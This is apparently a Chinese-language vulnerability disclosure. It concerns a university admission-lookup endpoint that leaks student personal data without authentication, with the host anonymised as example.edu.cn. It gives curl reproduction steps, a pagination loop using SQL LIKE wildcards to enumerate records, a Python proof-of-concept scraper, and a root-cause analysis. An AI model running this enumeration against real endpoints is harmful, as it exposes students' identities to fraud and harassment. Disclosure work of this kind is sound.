# 某高校招生录取查询接口未鉴权模糊搜索导致学生录取 PII 批量泄露

- **漏洞编号**：`<内部编号>`

- **目标资产**：`https://example.edu.cn`（招生子应用 `/xxx/`，组件版本 `<组件版本>`）
    
- **受影响接口**：`GET|POST https://example.edu.cn/xxx/s`
    
- **发现时间**：`<日期>`
    

## 概述

某高校招生子站的“录取查询”后端接口 `/xxx/s` 未做身份认证与结果范围限制。前端查询页宣称需要“身份证号 + 考生号”才能查询本人录取结果，但服务端并不校验这两个字段的归属关系，而是把用户传入的关键词直接做模糊匹配并返回命中的学生录取记录。

任意未登录访问者只要构造形如：

```
https://example.edu.cn/xxx/s?c=<栏目UUID>&x=1&share=1&q=<关键词>
```

即可命中真实学生记录，返回其 **考生号、姓名、性别、层次、录取专业** 等个人信息。`q` 中的 `%` 被当作 SQL `LIKE` 通配符生效，配合 `&p=N` 翻页可对任一姓名/前缀做持续枚举，构成未授权、可批量的学生 PII 泄露。

## 影响与危害

- 泄露真实录取数据，包含姓名 + 考生号 + 性别 + 层次 + 录取专业。
    
- 考生号是考生唯一标识，姓名 + 考生号组合已足以精准定位到具体自然人。
    
- 接口无需登录，任何互联网用户均可访问；`%` 通配符 + `p` 翻页可做穷举遍历，成规模导出名单。
    
- 可被用于精准诈骗、骚扰、社会工程；涉及学生敏感信息，合规与声誉风险高。
    
- 直接暴露真实业务 PII、无需认证、可自动化批量获取 → 建议高危。

> 说明：本次未确认身份证号字段泄露；但 `%` 通配符在服务端生效，说明关键词进入了 `LIKE` 语句，若后端匹配列含身份证号，存在进一步扩大泄露面的风险，需另行确认。

## 复现步骤

> 全程只读、无害、少量请求，不篡改/删除数据。

**前置**：无需登录、无需 Cookie。`c` 值取自查询页表单 action，为公开栏目 UUID。

1. 纯姓名子串命中真实记录：

```
curl -sk "https://example.edu.cn/xxx/s?c=<栏目UUID>&x=1&share=1&q=<关键词>"
```

返回示例：

```
考生号：<考生号> | 姓名：<姓名> | 性别：<性别> | 层次：<层次> | 录取专业：<专业>
```

2. 通配符 `%` 生效，可换人命中：

```
curl -sk "https://example.edu.cn/xxx/s?c=<栏目UUID>&x=1&share=1&q=<姓氏>%"
```

3. 通配 + 翻页枚举多名学生（`p` 为页码）：

```
for p in 2 3 4 5; do
  curl -sk "https://example.edu.cn/xxx/s?c=<栏目UUID>&x=1&share=1&q=<前缀>%&p=$p"
done
```

4. 对姓名首字、考生号前缀等重复步骤 2-3，即可持续枚举。

**判定**：未登录状态下返回真实学生录取 PII，且可用通配符 + 翻页枚举 → 漏洞成立。

## PoC

以下脚本仅用于单次只读验证，请勿用于批量拖取数据。

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC: 某高校招生录取查询接口未鉴权 PII 泄露
用途：只读验证——确认未登录状态下接口会按关键词返回真实学生录取记录。
用法：python3 poc.py <关键词>
"""
import ssl, sys, re, urllib.parse, urllib.request
BASE   = "https://example.edu.cn/xxx/s"
COMMON = {"c": "<栏目UUID>", "x": "1", "share": "1"}
CTX    = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
def query(q, p=1, timeout=20):
    url = BASE + "?" + urllib.parse.urlencode(dict(COMMON, q=q, p=str(p)))
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    return url, urllib.request.urlopen(req, timeout=timeout, context=CTX).read().decode("utf-8", "ignore")
def parse(html):
    m = re.search(r'id="conNT".*?</table>', html, re.S)
    if not m:
        return None
    cells = [re.sub(r'<[^>]+>|&nbsp;|\s+', '', c)
             for c in re.findall(r'<td[^>]*>(.*?)</td>', m.group(0), re.S)]
    cells = [c for c in cells if c]
    return cells[1::2]
if __name__ == "__main__":
    for q in (sys.argv[1:] or ["<关键词>"]):
        url, html = query(q)
        data = parse(html)
        print(f"[q={q}] {url}")
        print("  命中:", data if data else "无记录")
```

## 根因分析

1. 服务端缺失鉴权与归属校验：前端声明双要素查询，但服务端完全未验证，也未要求登录。
    
2. 关键词直接进入模糊查询且未转义：`%` 被当作 SQL `LIKE` 通配符原样生效。
    
3. 结果不设限、支持翻页：可枚举，放大为批量泄露。
    
4. 业务逻辑复用不当：响应文案/字段名表明查询可能复用了留言板/信箱查询逻辑。
    
5. 数据最小化缺失：直接明文返回考生号、姓名等字段，未做脱敏。
